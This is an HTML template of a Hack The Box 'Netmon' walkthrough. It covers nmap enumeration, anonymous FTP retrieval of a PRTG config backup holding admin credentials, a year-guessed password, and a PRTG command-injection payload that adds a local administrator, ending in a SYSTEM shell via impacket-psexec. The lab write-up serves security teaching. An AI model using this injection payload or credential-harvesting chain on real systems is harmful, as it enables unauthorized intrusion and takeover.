@@ -1,0 +1,152 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Netmon</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty 2.9</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV 10.129.42.182 --min-rate=2000 </u>
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-03-19  12:18AM                 1024 .rnd
+| 02-25-19  10:15PM       &lt;DIR>          inetpub
+| 07-16-16  09:18AM       &lt;DIR>          PerfLogs
+| 02-25-19  10:56PM       &lt;DIR>          Program Files
+| 02-03-19  12:28AM       &lt;DIR>          Program Files (x86)
+| 02-03-19  08:08AM       &lt;DIR>          Users
+|_10-16-25  03:56AM       &lt;DIR>          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC</code></pre></div>
+
+
+<p class="text">Although FTP port is open, we might have to see HTTP page for gathering interesting information like directory structure or running application. Let's do it.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/netmon/1-home.png' %}" alt="">
+    <p class="text">There is a login form and we discovered that the website is runnign with <u>PRTG</u>. However, we don't have credential to login. Then we can enumerate FTP directories for password search.</p>
+</div>
+
+<p class="text">Before entering FTP, I researched credential file location for PRTG, and google returned interesting information <a href="https://helpdesk.paessler.com/en/support/solutions/articles/76000074259-find-windows-credential">here</a>. We might find some juicy info in <u>C:\ProgramData\Paessler\PRTG Network Monitor\</u> directory.</p>
+
+
+
+<h2 class="subtitle">FTP Enumeration</h2>
+<div class="code-box"><pre><code>└─$ ftp 10.129.42.182
+Connected to 10.129.42.182.
+220 Microsoft FTP Service
+Name (10.129.42.182:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||50386|)
+125 Data connection already open; Transfer starting.
+02-03-19  12:18AM                 1024 .rnd
+02-25-19  10:15PM       &lt;DIR>          inetpub
+07-16-16  09:18AM       &lt;DIR>          PerfLogs
+02-25-19  10:56PM       &lt;DIR>          Program Files
+02-03-19  12:28AM       &lt;DIR>          Program Files (x86)
+02-03-19  08:08AM       &lt;DIR>          Users
+10-16-25  03:56AM       &lt;DIR>          Windows
+226 Transfer complete.
+ftp> cd ProgramData
+250 CWD command successful.
+ftp></code></pre></div>
+
+<p class="text">Anonymous login is passed, and I could enter ProgramData directory though it wasn't displayed. This is because FTP's defalut </p>
+
+
+<p class="text">Under the <u>/ProgramData/Paessler/PRTG Network Monitor</u>, I found <u>PRTG Configuration.old.bak</u> file. I downloaded it and saw data carefully, and that revealed username and password.</p>
+
+<div class="code-box"><pre><code>└─$ cat 'PRTG Configuration.old.bak' | grep admin -3 
+              0
+            &lt;/dbcredentials>
+            &lt;dbpassword>
+              &lt;!-- User: <u>prtgadmin</u> --&gt;
+              <u>PrTg@dmin2018</u>
+            &lt;/dbpassword>
+            &lt;dbtimeout>
+</code></pre></div>
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">Because we got credential from FTP server, we might be able to log on to the HTTP. However, when I tried to login, it returned error message.</p>
+
+<p class="text">Considering the build date of this machine, 2019, the password PrTg@dmin2018 is out of date, and the user owner may be reluctant to change password entirely. So, we may use password with just changing year part.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/netmon/3-login.png' %}" alt="">
+    <p class="text">As expected, I could pass the login form with credential <u>prtgadmin: PrTg@dmin2019</u>. Seeing the installed version section, <u>18.1.37.13946</u> is the running version on this website. </p>
+</div>
+
+<p class="text">Searching a keyworn 'PRTG &lt; 18.2.39 poc' revealed RCE vulerability. Also, <a href="https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/">this</a> page explains the steps for exploitation. According to the article, we can cause RCE with notification function.</p>
+
+<p class="text">Aheading to notification with setup section on top right -> account setting -> notification, you can see add button for new notification.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/netmon/4-add.png' %}" alt="">
+    <p class="text">Leaving first section default and skip to the <u>Execute Program</u>, and add parameter below...</p>
+</div>
+
+<div class="code-box"><pre><code>abc.txt ; net user xef0 asedf123! /add ; net localgroup administrators xef0 /add</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/netmon/5-bell.png' %}" alt="">
+    <p class="text">Then, re-navigate to the notification page and press bell mark. This might cause RCE and create administrator user named xef0. <br><br><u>※ Because of Windows password policy, your password cannot contain the user's account name or full name. Don't set password like 'user: user123asdf'</u></p>
+</div>
+
+
+<p class="text">If the RCE occured successfully, we can logon to target machine with impacket-psexec.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-psexec xef0:'asedf123!'@10.129.42.182
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated
+
+[*] Requesting shares on 10.129.42.182.....
+[*] Found writable share ADMIN$
+[*] Uploading file QvPnduXb.exe
+[*] Opening SVCManager on 10.129.42.182.....
+[*] Creating service cjfH on 10.129.42.182.....
+[*] Starting service cjfH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+
+
+<p class="text">We got authority account. You can locate root flag on <u>C:\Users\Administrator\Desktop</u>.</p>
+
+</body>
+</html>
